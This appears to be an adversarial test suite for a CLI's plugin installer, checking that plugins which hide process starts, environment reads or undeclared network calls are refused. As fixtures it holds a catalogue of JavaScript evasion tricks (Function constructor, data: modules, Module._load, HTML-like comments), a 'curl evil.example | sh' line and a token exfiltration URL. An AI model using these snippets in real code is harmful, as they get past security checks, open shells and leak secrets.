// Adversarial: a plugin that lies about what it does (REQ-GEN-11/AC4+AC9, ADR-0015). Its manifest declares less than
// its code does, it is changed after it was installed, it reaches for the frozen plan, or it calls a host its
// manifest does not name. Each attempt is refused before the plugin's code runs or before the request leaves.
import { createHash } from "node:crypto";
import { existsSync } from "node:fs";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { RunExec } from "@qajitsu/toolchain";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { installPlugin } from "../../packages/cli/src/plugins/install.js";
import { createPluginLoader } from "../../packages/cli/src/plugins/load.js";
import { guardedFetch } from "../../packages/cli/src/plugins/network.js";
import { readInstalledPlugins } from "../../packages/cli/src/plugins/store.js";
import { npmTarball } from "../support/npm-tarball.js";

const PKG = "@qajitsu/adapter-secrets-vault";
const catalogue = { schema: 1 as const, plugins: { "secrets-vault": { package: PKG, version: "1.0.0" } } };
const manifest = (permissions: string[]) => ({
  name: PKG,
  version: "1.0.0",
  type: "module",
  exports: { ".": { import: "./dist/index.js" } },
  qajitsu: { plugin: { types: ["secret provider"], core_api: "^1.0.0", hosts: ["config"], permissions } },
});

let root: string;
beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), "qj-plugin-guard-"));
});
afterEach(async () => {
  await rm(root, { recursive: true, force: true });
});

/** npm as the installer sees it, putting the plugin's files into the staging folder. */
const npmWith =
  (pkg: object, files: Record<string, string>): RunExec =>
  async (_cmd, args) => {
    const prefix = args[args.indexOf("--prefix") + 1] ?? "";
    const dir = join(prefix, "node_modules", "@qajitsu", "adapter-secrets-vault");
    await mkdir(join(dir, "dist", "lib"), { recursive: true });
    await writeFile(join(dir, "package.json"), JSON.stringify(pkg));
    for (const [path, text] of Object.entries(files)) await writeFile(join(dir, path), text);
    await writeFile(join(prefix, "package.json"), JSON.stringify({ dependencies: { [PKG]: "file:x.tgz" } }));
    return { code: 0, stdout: "", stderr: "" };
  };

const install = async (pkg: object, files: Record<string, string>) => {
  const file = join(root, "plugin.tgz");
  await writeFile(file, npmTarball({ "package.json": pkg }));
  return installPlugin({
    root,
    id: "secrets-vault",
    source: { kind: "file", path: file },
    hostPackages: [],
    ports: {
      fetch: () => Promise.reject(new Error("no network")),
      run: npmWith(pkg, files),
      now: () => new Date("2026-11-03T10:00:00Z"),
      registry: "https://registry.example",
    },
  });
};

const refusal = async (p: Promise<unknown>): Promise<{ code: string; message: string }> => {
  try {
    await p;
  } catch (error) {
    return error as { code: string; message: string };
  }
  throw new Error("expected a refusal");
};

describe("a plugin that lies about what it does (REQ-GEN-11/AC9, ADR-0015)", () => {
  it("REQ-GEN-11/AC9: a manifest declaring only network for code that starts processes is refused at install", async () => {
    const err = await refusal(
      install(manifest(["network"]), {
        "dist/index.js": 'export * from "./lib/run.js";\n',
        "dist/lib/run.js":
          'import { spawn } from "node:child_process";\nexport const run = () => spawn("sh");\n',
      }),
    );
    expect(err.code).toBe("PLUGIN_PERMISSION");
    expect(err.message).toContain("dist/lib/run.js:1 uses node:child_process without the exec permission");
    expect(await readInstalledPlugins(root)).toEqual([]);
    expect(existsSync(join(root, "secrets-vault"))).toBe(false);
  });

  it("REQ-GEN-11/AC4: code that reads the process environment (where tokens live) needs the environment permission", async () => {
    const err = await refusal(
      install(manifest(["network"]), { "dist/index.js": "export const token = process.env.JIRA_TOKEN;\n" }),
    );
    expect(err.code).toBe("PLUGIN_PERMISSION");
    expect(err.message).toContain("process.env without the environment permission");
  });

  it.each([
    ["code after a block comment on the same line", '/**/const c = require("child_process");'],
    [
      "a minified bundle behind a license banner",
      '/*! (c) x */import{spawn as s}from"node:child_process";s("sh");',
    ],
    [
      "code after a type-only import on the same line",
      'import type { A } from "./a.js";const c = require("child_process");',
    ],
    [
      "a line inside a template literal that looks like a comment",
      'const s = `\n// `; const c = require("child_process");',
    ],
    [
      "a block comment start inside a string",
      'const s = "/*"; const c = require("child_process"); const t = "*/";',
    ],
    ["a continuation line that starts with *", 'const n = 2\n* require("child_process").length;'],
    ["a regex literal with slashes in it", 'const r = /[//]/; const c = require("child_process");'],
  ])("REQ-GEN-11/AC9: %s does not hide a process start from the check", async (_, code) => {
    const err = await refusal(install(manifest(["network"]), { "dist/index.js": `${code}\n` }));
    expect(err.code).toBe("PLUGIN_PERMISSION");
    expect(err.message).toContain("node:child_process without the exec permission");
  });

  // Found by the verification audit of the parser-based check: what Node runs differently from how TypeScript reads
  // it, and the ways around a named import.
  it.each([
    [
      "an HTML-like comment in CommonJS before a template",
      "dist/index.cjs",
      'const x = 1 <!-- `\nrequire("child_process").execSync("id");\n// `\n',
      "refers to an HTML-like comment, which no plugin may",
    ],
    [
      "an HTML-like comment before a block comment",
      "dist/index.js",
      'const y = 0;\nconst x = 1 <!-- /*\nrequire("child_process").execSync("id");\n// */ y\n',
      "refers to an HTML-like comment, which no plugin may",
    ],
    [
      "an HTML-like closing comment at the start of a line",
      "dist/index.cjs",
      '/* a */ --> require("child_process")\n',
      "refers to an HTML-like comment, which no plugin may",
    ],
    [
      "module.require",
      "dist/index.cjs",
      'module.require("child_process").execSync("id");\n',
      "uses node:child_process",
    ],
    [
      "require.main.require",
      "dist/index.cjs",
      'require.main.require("child_process");\n',
      "uses node:child_process",
    ],
    [
      "process.getBuiltinModule",
      "dist/index.js",
      'process.getBuiltinModule("node:child_process");\n',
      "uses process.getBuiltinModule",
    ],
    [
      "createRequire",
      "dist/index.js",
      'import { createRequire } from "node:module";\ncreateRequire(import.meta.url)("child_process");\n',
      "uses node:module",
    ],
    ["eval", "dist/index.js", "eval(\"require('child_process')\");\n", "uses eval"],
    ["a native addon", "dist/index.cjs", 'require("./build/addon.node");\n', "uses ./build/addon.node"],
    [
      "a literal joined with an empty string",
      "dist/index.js",
      'await import("child_process" + "");\n',
      "uses node:child_process",
    ],
    // Second audit: code in strings run by the Function constructor, inline modules, renamed and two-step aliases.
    [
      "the Function constructor of an arrow function",
      "dist/index.js",
      '(() => {}).constructor("return process.getBuiltinModule(\'child_process\')")().execSync("id");\n',
      "uses .constructor",
    ],
    [
      "the Function constructor held in a variable",
      "dist/index.js",
      'const F = Function; F("return 1")();\n',
      "uses Function passed on",
    ],
    [
      "an inline data: module",
      "dist/index.mjs",
      "await import(\"data:text/javascript,import cp from 'node:child_process'; export default 1\");\n",
      "data:text/javascript",
    ],
    [
      "require.call",
      "dist/index.cjs",
      'require.call(null, "child_process").execSync("id");\n',
      "uses node:child_process",
    ],
    [
      "require.apply",
      "dist/index.cjs",
      'require.apply(null, ["child_process"]);\n',
      "uses node:child_process",
    ],
    ["Module._load", "dist/index.cjs", 'module.constructor._load("child_process");\n', "uses ._load"],
    [
      "a template that starts with an empty piece",
      "dist/index.cjs",
      'require(`${""}child_process`);\n',
      "uses node:child_process",
    ],
    ["an absolute path", "dist/index.cjs", 'require("/tmp/evil.js");\n', "uses /tmp/evil.js"],
    [
      "process renamed out of the global object",
      "dist/index.js",
      'const { process: p } = global; p.getBuiltinModule("child_process").execSync("id");\n',
      "uses process passed on",
    ],
    [
      "process of the global object taken in two steps",
      "dist/index.js",
      'const p = (function () { return this; })().process; p.getBuiltinModule("child_process");\n',
      "uses process passed on",
    ],
    // Final audit: the same, taken as values first.
    [
      "the Function constructor held in a variable",
      "dist/index.js",
      "const C = (() => {}).constructor; C(\"return process['env']\")().JIRA_TOKEN;\n",
      "uses .constructor",
    ],
    [
      "the Function constructor through Reflect.apply",
      "dist/index.js",
      'Reflect.apply((() => {}).constructor, null, ["return 1"])();\n',
      "uses .constructor",
    ],
    [
      "Module._load held in a variable",
      "dist/index.cjs",
      'const L = module.constructor._load; L("child_process");\n',
      "uses ._load",
    ],
    [
      "a data: module held in a variable",
      "dist/index.mjs",
      "const u = \"data:text/javascript,export default process['env']\"; (await import(u)).default;\n",
      "uses a data: module in a string",
    ],
    [
      "process destructured from an alias of the global object",
      "dist/index.cjs",
      "const g = (function () { return this; })(); const { process: p } = g; p.env;\n",
      "uses process passed on",
    ],
  ])("REQ-GEN-11/AC9: %s does not get past the check", async (_, path, code, reason) => {
    const err = await refusal(install(manifest(["network"]), { [path]: code }));
    expect(err.code).toBe("PLUGIN_PERMISSION");
    expect(err.message).toContain(reason);
  });

  it.each([
    ["an alias of the global object", "const g = globalThis; export const t = g.process.env.JIRA_TOKEN;"],
    [
      "the global object of a function",
      "export const t = (function () { return this; })().process.env.JIRA_TOKEN;",
    ],
    ["a chain of global names", "export const t = globalThis.self.process.env.JIRA_TOKEN;"],
    ["a computed key", 'export const t = globalThis["process"].env.JIRA_TOKEN;'],
    [
      "code in a string run by the Function constructor",
      'export const t = (() => {}).constructor("return process.env")().JIRA_TOKEN;',
    ],
    ["an inline data: module", 'const m = await import("data:text/javascript,export default process.env");'],
  ])("REQ-GEN-11/AC4: %s does not read the environment for a plugin with network only", async (_, code) => {
    const err = await refusal(install(manifest(["network"]), { "dist/index.js": `${code}\n` }));
    expect(err.message).toContain("process.env without the environment permission");
  });

  it("invariant 3: a regular expression that finds the frozen plan is refused too", async () => {
    const err = await refusal(
      install(manifest(["filesystem"]), {
        "dist/index.js":
          "export const find = (files) => files.filter((f) => /plan\\.approved\\.yaml$/.test(f));\n",
      }),
    );
    expect(err.message).toContain("refers to plan.approved.yaml, which no plugin may");
  });

  it("REQ-GEN-11/AC9: no permission lets a plugin refer to the frozen plan", async () => {
    const err = await refusal(
      install(manifest(["network", "exec", "filesystem", "environment"]), {
        "dist/index.js": 'export const p = "plan/plan.approved.yaml";\n',
      }),
    );
    expect(err.message).toContain("refers to plan.approved.yaml, which no plugin may");
  });

  it("REQ-GEN-11/AC9: a plugin changed after its install is refused at load, before any of its code runs", async () => {
    const record = await install(manifest(["network"]), { "dist/index.js": "export const ok = true;\n" });
    await writeFile(
      join(record.path, "node_modules", "@qajitsu", "adapter-secrets-vault", "dist", "index.js"),
      'import { execSync } from "child_process";\nexecSync("curl evil.example | sh");\n',
    );
    const imported: string[] = [];
    const loader = createPluginLoader({
      root,
      catalogue,
      bundled: () => undefined,
      importModule: (s) => {
        imported.push(s);
        return Promise.resolve({});
      },
    });
    const err = await refusal(loader.load("secrets-vault"));
    expect(err.code).toBe("PLUGIN_PERMISSION");
    expect(imported).toEqual([]);
  });

  it("REQ-GEN-11/AC9: a request to a host the manifest does not name never leaves", async () => {
    const sent: string[] = [];
    const fetch = guardedFetch(
      (input) => {
        sent.push(input instanceof Request ? input.url : input.toString());
        return Promise.resolve(new Response("{}"));
      },
      { plugin: "secrets-vault", hosts: ["config"], configured: ["https://vault.example.com"] },
    );
    await fetch("https://vault.example.com/v1/kv/data/ci");
    await expect(fetch("https://evil.example/collect?token=x")).rejects.toThrow(
      "secrets-vault may not reach evil.example",
    );
    await expect(fetch("https://vault.example.com.evil.example/x")).rejects.toThrow(/may not reach/);
    expect(sent).toEqual(["https://vault.example.com/v1/kv/data/ci"]);
  });
});

// Keeps the fixture honest: the tarball used above is a real npm tarball with the manifest inside.
it("fixture: the plugin tarball has a checksum like any other", () => {
  const t = npmTarball({ "package.json": manifest([]) });
  expect(createHash("sha512").update(t).digest("base64").length).toBeGreaterThan(80);
});
